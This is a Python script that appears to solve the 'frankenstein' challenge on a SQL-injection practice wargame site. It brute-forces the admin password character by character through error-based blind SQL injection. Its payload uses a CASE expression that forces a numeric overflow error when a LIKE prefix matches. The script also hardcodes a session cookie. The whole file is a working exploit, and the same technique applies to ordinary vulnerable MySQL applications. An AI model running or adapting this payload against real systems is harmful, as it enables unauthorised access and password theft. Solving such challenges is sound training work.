import requests
import time

url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php"
cookies = dict(PHPSESSID="1j4nr4gc2tcc0k9e68hquspdvb")

pw = ''
for i in range(1,10):
    for j in range(48, 128):
        payload = f"1' or case when id='admin' and pw like '{pw+chr(j)}%' then 9e300*9e300 else 0 end#"

        response = requests.get(url, cookies=cookies, params={"pw": payload})

        if 'mysqli' not in response.text:
            pw += chr(j)
            break
    else:
        print("Failed")
        break
print(pw)